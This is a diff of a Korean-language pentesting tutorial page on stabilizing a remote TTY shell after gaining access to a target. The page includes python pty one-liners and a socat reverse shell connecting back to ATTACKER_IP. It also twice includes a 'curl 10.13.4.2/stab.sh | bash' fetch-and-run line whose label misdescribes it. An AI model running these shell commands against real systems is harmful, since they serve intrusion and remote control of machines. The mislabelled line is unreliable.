@@ -1,4 +1,11 @@
-
+---
+layout: page
+title: Interactive_Shell_(shell_안정화)
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
 # TTY 셸 안정화 가이드
 
@@ -22,7 +29,7 @@ PS1='[\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]]\$ '
 
 가장 먼저, Python(또는 다른 스크립트 언어)을 이용해 기본적인 PTY(Pseudo-Terminal)를 생성합니다. 이것만으로도 셸의 기능이 일부 개선됩니다.
 
-```bash title="Python을 이용한 PTY 셸 생성"
+```bash
 # 시스템에 설치된 Python 버전에 맞게 시도
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -39,11 +46,11 @@ script -qc /bin/bash /dev/null
 ```
 
 `socat` : `socat`이 설치되어 있다면 가장 강력하고 안정적인 셸을 얻을 수 있음. 공격자 PC에서 리스너를 열고, 타겟 서버에서 접속하는 방식.
-```bash title="Attacker_Kali (리스너)"
+```bash
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
-```bash title="Target (접속)"
+```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
 ```
 
@@ -69,7 +76,7 @@ PTY 셸을 생성한 후, 다음 절차를 통해 로컬 터미널과 동일한 
 #### **[2] 로컬 터미널 환경 설정**
 - 공격자(로컬) 머신에서 다음 명령어를 입력하여 터미널을 'raw' 모드로 설정하고, 백그라운드의 셸을 다시 포어그라운드로 가져옵니다.
 
-```bash(title="공격자 머신 (Kali)")
+```bash
 # 현재 터미널의 특수 문자 처리를 비활성화하고(raw), 입력 문자를 화면에 바로 표시하지 않도록(-echo) 설정
 stty -a
 stty raw -echo; fg
@@ -80,7 +87,7 @@ stty raw -echo; fg
 #### **[3] 원격 셸 환경 변수 설정**
 - 이제 원격 셸은 안정화되었지만, 터미널 크기나 종류가 제대로 설정되지 않아 화면 출력이 깨질 수 있습니다. 다음 명령어로 환경을 최종 설정합니다.
 
-```bash(title="원격 셸 (Target)")
+```bash
 # 터미널 종류를 xterm-256color로 설정 (가장 일반적)
 export TERM=xterm-256color
 
@@ -90,7 +97,7 @@ stty rows 38 cols 115
 
 > **팁:** 로컬 터미널의 크기는 새 터미널을 열고 `stty -a` 명령어로 확인할 수 있습니다.
 
-```bash title="this checks ur rows and columns in ur current shell"
+```bash
 curl 10.13.4.2/stab.sh | bash
 ```
 
@@ -110,7 +117,7 @@ which zsh && /bin/zsh
 
 ---
 
-```bash title="this checks ur rows and columns in ur current shell"
+```bash
 curl 10.13.4.2/stab.sh | bash
 ```
 
